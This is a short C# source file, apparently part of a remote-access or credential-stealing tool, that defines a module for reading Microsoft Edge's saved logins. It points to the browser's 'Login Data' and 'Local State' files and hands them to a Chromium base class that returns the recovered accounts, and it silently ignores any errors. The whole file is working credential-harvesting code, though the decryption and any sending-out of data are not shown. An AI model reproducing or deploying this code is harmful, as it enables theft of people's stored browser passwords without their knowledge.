using Q3C273.Shared.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Ton618.Recovery.Browsers
{
    public class EdgePassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Microsoft Edge";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Default\\Login Data");
                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
